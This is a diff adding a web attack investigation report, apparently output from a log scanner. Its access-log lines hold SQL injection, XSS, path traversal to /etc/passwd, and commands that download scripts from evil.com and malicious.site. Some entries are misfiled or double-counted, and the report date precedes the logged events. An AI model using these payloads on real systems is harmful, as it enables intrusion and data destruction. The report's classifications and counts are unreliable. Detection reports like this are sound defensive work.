@@ -1,0 +1,21 @@
+Web Attack Investigation Report
+Generated on: 2024-11-11 11:44:12.138281
+
+Total Attacks Detected: 8
+
+SQL Injection: 2 occurrence(s)
+  [12/Nov/2024:14:05:00 +0000] 198.51.100.11 -> GET /index.php?id=1;DROP TABLE users HTTP/1.1
+  [12/Nov/2024:14:07:00 +0000] 192.168.1.2 -> GET /search?q=<img+src%3Dnull+onerror%3Dalert%28%27xss%27%29> HTTP/1.1
+
+XSS: 1 occurrence(s)
+  [12/Nov/2024:14:01:00 +0000] 203.0.113.5 -> GET /search.php?q=<script>alert('xss')</script> HTTP/1.1
+
+Directory Traversal: 2 occurrence(s)
+  [12/Nov/2024:14:02:00 +0000] 10.0.0.2 -> GET /../../etc/passwd HTTP/1.1
+  [12/Nov/2024:14:06:00 +0000] 192.0.2.1 -> GET /?q=%2E%2E%2F%2E%2E%2Fetc%2Fpasswd HTTP/1.1
+
+Command Injection: 3 occurrence(s)
+  [12/Nov/2024:14:03:00 +0000] 198.51.100.10 -> GET /?cmd=wget%20http://malicious.site/payload.sh HTTP/1.1
+  [12/Nov/2024:14:05:00 +0000] 198.51.100.11 -> GET /index.php?id=1;DROP TABLE users HTTP/1.1
+  [12/Nov/2024:14:08:00 +0000] 192.168.1.1 -> GET /admin?cmd=powershell%20Invoke-WebRequest%20http://evil.com/script.ps1 HTTP/1.1
+
